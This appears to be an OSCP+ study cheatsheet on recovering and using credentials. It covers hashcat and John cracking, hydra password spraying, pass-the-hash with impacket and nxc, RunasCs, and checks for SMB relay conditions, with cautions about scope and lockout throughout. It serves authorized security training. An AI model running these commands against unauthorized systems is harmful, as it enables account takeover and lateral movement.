    10.8 Credentials and Cracking Cheatsheet

    Found a password, hash or key?

    Identify its artifact type, account scope and supported use.

    Start the first checks →
    Need password recovery?

    Select a format-matched offline recovery workflow.

    Follow the finding →

    ← Cheatsheet index | Full procedure | Strategy map | Study methods: Recover and use authentication material

    source -> format -> identity/context -> compatible use -> authentication
-> authorization -> new access -> re-enumerate

    10.8.1 Classify

    Run/context: classify and process recovered artifacts on the testing workstation; authentication checks contact the explicitly selected service. Decide: an NT hash, Net-NTLMv2 response and Kerberos cache are different capabilities. Follow the matching format section below; use one known credential validation before choosing remote access. Offline recovery alone does not establish service access.

    hashid HASH_OR_FILE
john --list=formats | grep -i KEYWORD
hashcat --example-hashes | less
    MaterialDo not confuse it withNext action
    NT hashNet-NTLMv2 responseCrack mode 1000 or compatible NTLM PtH
    Net-NTLMv2Reusable NT hashCrack mode 5600 or authorized relay conditions
    DCC2/MSCache v2NT hashOffline recovery with username; not ordinary PtH
    .kirbi/ccachePassword/hashValidate ticket, SPN, time and service
    SSH keyPasswordFix permissions; crack only its passphrase if protected
    KeePass/ZIP/PDF/OfficeRaw passwordConvert with matching *2john tool

    10.8.2 Validate one known credential

     
    ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore

    Login accepted proves authentication to that service. Shares, sessions, execution and administrator rights are separate authorization claims.

    10.8.3 Test bounded password candidates after checking lockout constraints Authorized online dictionary/spray

    10.8.3.1 one known user, candidate passwords

    # one known user, candidate passwords
hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET

    10.8.3.2 one password, candidate users

    # one password, candidate users
hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET

    HTTP form after capturing the real request and failure marker:

    hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'

    Check lockout/rate controls first and manually confirm tool hits. Dynamic CSRF/cookies and weak condition strings require manual handling.

    10.8.4 Recover a password with a format-matched Hashcat job Hashcat

    Use the identified verifier format and a feasible offline candidate strategy.     
    hashcat -b -m MODE
hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head

    10.8.4.1 known pattern

    # known pattern
hashcat -a 3 -m MODE hashes.txt '?u?l?l?l?l?d?d?d' --session mask-job

    10.8.4.2 word plus three digits

    # word plus three digits
hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session hybrid-job

    10.8.4.3 resume

    # resume
hashcat --session job --restore

    -a 0 is dictionary mode; -a 3 expects a mask, not a wordlist. Measure the actual mode before attempting a large keyspace.

    # confirm modes locally
hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH|Kerberos'

    Common current mappings: NTLM 1000, Net-NTLMv2 5600, KeePass 13400, AS-REP etype 23 18200, TGS etype 23 13100. Installed help/example hashes win.

    10.8.5 Recover a password from a supported verifier with John John

    Use the identified verifier format and a feasible offline candidate strategy.     
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --session=job --wordlist=wordlist.txt hash.txt
john --restore=job

    10.8.6 Extract a password verifier from the protected file Convert protected files

     
    zip2john archive.zip > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
7z2john archive.7z > 7z.hash
unshadow passwd.copy shadow.copy > linux.hash

    10.8.7 Recover a passphrase for an accessible SSH private key SSH key

     
    chmod 600 id_rsa
ssh-keygen -y -f id_rsa > derived.pub
ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET

    # protected key recovery
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt --rules=Jumbo ssh.hash
john --show ssh.hash

    Key unlock and server authorization are separate. Permission denied (publickey) can occur after the passphrase was correct.

    10.8.8 Recover passwords from accessible Linux password verifiers Linux password records

     
    unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=Jumbo linux.hash
john --show linux.hash

    10.8.9 Authenticate with an NT hash where the service supports it Pass-the-hash

     
    nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore

    Authentication ≠ remote authorization. Re-enumerate every service/share/right after a successful identity transition. Responder spoofing is prohibited on the OSCP+ exam; keep capture/relay work to explicitly authorized labs.

    10.8.10 Select offline recovery for captured responses or cached verifiers Net-NTLMv2 and DCC2

     
    hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
john --format=mscash2 --wordlist=wordlist.txt dcc2.hash

    Neither is a reusable NT hash. Net-NTLMv2 relay is a separate live exchange; DCC2 preserves username-dependent context.

    10.8.11 Inspect available tickets and determine where they can authenticate Kerberos ticket/cache

     
    klist
KRB5CCNAME=TICKET.ccache klist
impacket-ticketConverter TICKET.kirbi TICKET.ccache

    Check principal, realm, TGT/TGS type, SPN, validity, clock, DNS/FQDN, route and service rights.

    10.8.14 Use a known password from a Windows foothold

    Run a reviewed RunasCs build on the current Windows host with the intended account scope. It accepts a plaintext password, not an NT hash.

    REM Domain account: inspect the resulting token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN
REM Local account on this host
RunasCs.exe USER PASSWORD "cmd /c whoami /all"
REM Network-only: local identity stays unchanged; inspect the remote result
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9

    With logon type 9, whoami does not validate the outbound password. An authentication success is separate from resource authorization or an elevated token. Full credential-use procedure.

    10.8.15 Discover and recognize candidates

    Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

    10.8.15.1 Recover and use authentication material

    10.8.15.1.1 Find: Classify the artifact and its identity context

    Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode.

    file FILE
head -c 160 FILE

    Recognize: Headers and producing context distinguish a private key, challenge response and stored NT verifier.

    Validate next: Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations.

    Classify the artifact and its identity context.

    10.8.15.1.2.1 Net-NTLMv2 relay is a live authentication path, not hash reuse

    A captured Net-NTLMv2 response is suitable for offline recovery, but cannot be passed as an NT hash. A relay path instead needs a fresh inbound NTLM authentication event, a different reachable target that accepts the relayed protocol, target protections that permit the exchange, and useful authorization for the relayed identity.

    For an explicitly selected SMB destination, inspect signing behavior before considering it a relay receiver:

    nmap -p 445 --script smb2-security-mode TARGET

    Interpret: signing required closes the ordinary SMB-to-SMB relay receiver path. Signing enabled but not required is only one prerequisite; it does not supply an authentication source, bypass EPA/channel binding on another protocol, or grant the relayed identity useful rights.

    The current OSCP+ exam guide prohibits poisoning/spoofing. Do not use Responder-style name-resolution poisoning in the exam workflow. A direct, already-existing authentication source still needs a separately reviewed, scope-compliant relay procedure and an action-specific verification; the incomplete procedure is tracked as RW09.

    Every newly usable identity returns to Block 10 before movement:

    VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES

    Verify: Identify artifact type, source, account/domain and compatible next operation; record unknowns instead of guessing.

    If it fails: A 32-character hexadecimal value is not enough to identify its algorithm. Use application/source evidence and converters.

    10.8.15.1.3 Find: Validate known passwords and context-specific reuse

    Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation.

    nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'

    Recognize: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM.

    Validate next: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization.

    Validate known passwords and context-specific reuse.

    10.8.15.1.4 Commands and use-case variants

    Need: A credential artifact with a recorded source and possible account context. Correct local/domain/application identity, reachable compatible service, accepted authentication and account state

    Use the normal client for the observed service:

    ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore

    Local Windows account:

    nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares

    Decisive output: the destination service accepts the intended identity. Share, session or action access is a separate authorization result.

    10.8.15.1.5 Variant — known user, targeted password dictionary 
    hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET

    Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.

    10.8.15.1.6 Variant — one password across an authorized user list 
    hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success

    One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.

    10.8.15.1.7 Variant — HTTP POST form

    Capture a correct request and stable failure marker with Burp:

    hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'

    Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.

    10.8.15.1.8 RunasCs — test a known password from an existing Windows shell

    Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.

    10.8.15.1.9 Domain account: verify the new process token

    REM Domain account: verify the new process token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN

    10.8.15.1.10 Local account: omit the domain switch for the current host's account

    REM Local account: omit the domain switch for the current host's account
RunasCs.exe USER PASSWORD "cmd /c whoami /all"

    10.8.15.1.11 Network-only credentials: local identity stays unchanged

    REM Network-only credentials: local identity stays unchanged
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9

    Read: in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.

    RunasCs upstream. Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.

    accepted identity -> groups/roles -> reachable services -> shares/files
-> authenticated application behavior -> accessible hosts/routes
-> new credentials/tickets/sessions -> privilege and movement handoffs

    Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.

    net accounts /domain

    Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess

    Password validation belongs to the existing credential procedure. Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately.

    Verify: Record exact identity, service and tested read/write/session effect; classify authentication and authorization separately.

    If it fails: Account disabled, expired password, wrong domain and denied logon require different responses. Avoid repeating a known-valid password against a denied action.

    10.8.15.1.13 Commands and use-case variants

    Need: A credential artifact with a recorded source and possible account context. Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend

    hashcat -b -m MODE
python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"

    Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:

    exact recovered/default candidates -> organization/user/product words
-> observed policy and mutations -> small dictionary plus rules
-> known mask/hybrid -> broader curated lists/rules
-> exhaustive search only when its measured cost is defensible

    Preview mutations before spending the candidate budget:

    hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50

    hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show

    -a 0 is dictionary mode. Do not use -a 3 with a wordlist; attack mode 3 expects a mask.

    Common source examples identify NTLM as mode 1000, Net-NTLMv2 as 5600 and KeePass as 13400, but confirm against the installed version:

    hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'

    hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
hashcat --session targeted-mask --restore

    Mask order is a hypothesis about structure. Estimate its keyspace before committing time.

    Verify: Use the tool's show/result output and then validate the recovered credential in its correct context.

    10.8.15.1.19 Commands and use-case variants

    10.8.15.1.23 Commands and use-case variants

    Need: A credential artifact with a recorded source and possible account context. Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights

    Offline recovery:

    hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT --wordlist=wordlist.txt nt.hash

    Compatible SMB validation:

    nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares

    NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.

    10.8.15.1.24 Variant — remote access/execution when the identity has matching rights 
    impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore

    WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.

    Verify: Verify source/type, identity context and the exact permitted service action.

    If it fails: Local/domain confusion, remote UAC and denied NTLM are different from an invalid hash. Use tickets only when their own prerequisites exist.

    10.8.15.1.26 Commands and use-case variants
